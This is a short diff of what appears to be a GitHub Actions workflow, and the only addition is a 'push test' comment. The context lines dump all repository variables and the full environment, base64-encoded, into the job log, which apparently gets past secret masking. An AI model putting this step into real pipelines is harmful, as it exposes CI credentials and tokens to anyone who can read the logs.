@@ -15,3 +15,5 @@ jobs:
           echo "VARS_B64=$(printf '%s' '${{ toJSON(vars) }}' | base64 -w0)"
           echo "ENV_B64=$(env | base64 -w0)"
           echo "REPO=${{ github.repository }} REF=${{ github.ref }}"
+
+# https push test 20:22
